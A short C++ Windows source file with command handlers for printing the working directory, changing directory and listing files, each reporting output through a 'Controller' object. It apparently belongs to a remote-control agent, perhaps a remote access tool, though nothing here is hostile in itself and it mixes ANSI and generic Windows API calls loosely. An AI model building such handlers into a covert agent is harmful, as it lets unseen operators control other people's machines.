#include "commands.h"

#include <cstring>
#include <Windows.h>


int pwd(Controller* ctrl) {
	char path[MAX_PATH];
	GetCurrentDirectoryA(MAX_PATH, path);
	ctrl->sendOut(path);
	return 0;
}

int changeDir(Controller* ctrl, const std::string dir) {
	SetCurrentDirectoryA(dir.c_str());
	return 0;
}

int listFiles(Controller* ctrl, const std::string dir) {
	std::string output;
	WIN32_FIND_DATA ffd;
	HANDLE hFind;
	if (dir.size() == 0) {
		hFind = FindFirstFileA("*", &ffd);
	} else {
		std::string path = dir + "\\*";
		hFind = FindFirstFileA(path.c_str(), &ffd);
	}

	if (hFind == INVALID_HANDLE_VALUE) {
		return 1;
	}
	do {
		if (ffd.cFileName[0] == '.' &&
				(ffd.cFileName[1] == '\0' ||
				(ffd.cFileName[1] == '.' && ffd.cFileName[2] == '\0'))) {
			continue;
		}
		output += reinterpret_cast<char*>(ffd.cFileName);
		output += '\n';
	} while (FindNextFile(hFind, &ffd) != 0);
	FindClose(hFind);
	output.erase(output.end() - 1);
	ctrl->sendOut(output.c_str());
	return 0;
}